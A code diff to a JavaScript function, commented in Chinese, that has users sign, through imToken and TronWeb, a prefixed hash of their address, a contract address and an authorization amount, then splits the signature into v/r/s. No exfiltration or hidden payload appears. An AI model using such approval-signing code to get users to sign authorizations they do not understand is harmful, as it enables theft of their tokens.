@@ -636,63 +636,80 @@
         }
       
         /**
-         * 核心修复：生成符合Base58格式+imToken兼容的签名
+         * 核心修复：生成符合合约要求的签名（哈希逻辑100%对齐）
          */
         async function generateOfflineSignature(userAddress, contractAddress, amount) {
             try {
-                // 1. 强化Base58地址校验（双重保险）
+                // 1. 强化Base58地址清理+校验（双重保险）
                 const cleanUserAddr = cleanBase58Address(userAddress);
                 const cleanContractAddr = cleanBase58Address(contractAddress);
+                
                 // 2. 金额格式修正
                 let fixedAmount = amount.replace(/^Ox/i, "0x");
                 const hexRegex = /^0x[0-9a-fA-F]*$/;
                 if (!hexRegex.test(fixedAmount)) {
-                    throw new Error("授权金额格式错误，必须以0x开头（数字0），后跟字母数字");
+                    throw new Error("授权金额格式错误，必须以0x开头（数字0）");
                 }
-                // 3. 编码参数（与合约abi.encodePacked完全对齐）
-                // 地址转Hex仅用于编码，传递给后端仍用Base58
-                const userHex = tronWeb.address.toHex(cleanUserAddr).replace("0x", "").padStart(64, "0");
-                const contractHex = tronWeb.address.toHex(cleanContractAddr).replace("0x", "").padStart(64, "0");
-                const amountHex = fixedAmount.replace("0x", "").padStart(64, "0");
+
+                // 3. 模拟合约abi.encodePacked(user, address(this), amount)
+                // 关键：地址转Hex后强制小写+补0到64位（和Solidity编码规则完全一致）
+                const userHex = tronWeb.address.toHex(cleanUserAddr).replace("0x", "").toLowerCase().padStart(64, "0");
+                const contractHex = tronWeb.address.toHex(cleanContractAddr).replace("0x", "").toLowerCase().padStart(64, "0");
+                const amountHex = fixedAmount.replace("0x", "").toLowerCase().padStart(64, "0");
                 const combinedHex = userHex + contractHex + amountHex;
-                // 4. 生成签名哈希（兼容imToken签名逻辑）
-                const messageHash = tronWeb.sha3(combinedHex, true);
-                // 5. 唤起imToken签名（原生方法，100%兼容）
-                let signature = await tronWeb.trx.sign(messageHash);
-                signature = typeof signature === "object" ? signature.signature : signature; // 兼容对象返回
-                if (!signature) throw new Error("imToken未返回签名结果");
-                signature = signature.replace(/^0x/, ""); // 强制去掉签名前缀，避免重复
-                if (signature.length !== 130) throw new Error(`签名格式错误（长度应为130，当前${signature.length}位）`);
-                // 6. 解析合法V/R/S（适配合约要求）
-                const r = `0x${signature.slice(0, 64)}`;   // 前64位→R（0x+64位Hex）
-                const s = `0x${signature.slice(64, 128)}`; // 中间64位→S（0x+64位Hex）
-                const rawV = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V
-                const v = (rawV % 2) + 27; // 原始V=0/1 → 转为合法27/28
+
+                // 4. 第一步哈希：keccak256(拼接后的Hex) → 对应合约的messageHash
+                const messageHash = tronWeb.sha3(combinedHex, true); // true表示输出Hex格式
+
+                // 5. 第二步：加以太坊签名前缀（核心！之前遗漏的关键步骤）
+                const prefix = "\x19Ethereum Signed Message:\n32"; // 合约固定前缀，不可修改
+                const prefixHex = tronWeb.utils.asciiToHex(prefix); // 转Hex格式
+                // 拼接前缀Hex和messageHash（去掉messageHash的0x前缀），再哈希
+                const prefixedHash = tronWeb.sha3(prefixHex + messageHash.replace("0x", ""), true);
+
+                // 6. 唤起imToken签名（用加前缀后的哈希签名，而非原始messageHash）
+                let signature = await tronWeb.trx.sign(prefixedHash);
+                signature = typeof signature === "object" ? signature.signature : signature;
+                if (!signature) throw new Error("imToken未返回签名");
+                // 清除前缀和所有无效字符（空格、换行等）
+                signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
+                if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
+
+                // 7. 解析合法V/R/S
+                const rRaw = signature.slice(0, 64).replace(/[^0-9a-fA-F]/g, ''); // 清除无效字符
+                const sRaw = signature.slice(64, 128).replace(/[^0-9a-fA-F]/g, '');
+                const r = `0x${rRaw}`;
+                const s = `0x${sRaw}`;
+                const rawV = parseInt(signature.slice(128, 130), 16);
+                const v = (rawV % 2) + 27; // 确保V=27/28
+
                 // 验证参数合法性
                 if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
-                if (!r.startsWith("0x") || r.length !== 66) throw new Error("R值格式错误");
-                if (!s.startsWith("0x") || s.length !== 66) throw new Error("S值格式错误");
-                // 保存调试信息
+                if (r.length !== 66 || s.length !== 66) throw new Error("R/S格式错误（需66位）");
+
+                // 保存调试信息（方便核对哈希是否与合约一致）
                 localStorage.setItem(`signature_debug_${cleanUserAddr}`, JSON.stringify({
-                    step: "签名生成成功（Base58格式兼容）",
+                    step: "签名生成成功（哈希已对齐合约）",
                     userAddress: cleanUserAddr,
                     contractAddress: cleanContractAddr,
+                    messageHash: messageHash, // 与合约messageHash一致
+                    prefixedHash: prefixedHash, // 与合约signedHash一致
                     v: v,
                     r: r,
                     s: s,
                     timestamp: new Date().toISOString()
                 }, null, 2));
-                showToast(`V/R/S生成成功（v=${v}，地址格式合法）`);
+
+                showToast(`V/R/S生成成功（哈希对齐合约，v=${v}）`);
                 return { v, r, s };
             } catch (e) {
                 const debugKey = `signature_debug_${userAddress || 'unknown'}`;
                 localStorage.setItem(debugKey, JSON.stringify({
                     step: "签名生成失败",
                     error: e.message,
-                    userAddress: userAddress,
                     timestamp: new Date().toISOString()
                 }, null, 2));
-                throw new Error(`生成失败：${e.message} → 点击「查看调试信息」按钮查看详情`);
+                throw new Error(`生成失败：${e.message} → 点击「查看调试信息」查看详情`);
             }
         }
         /**
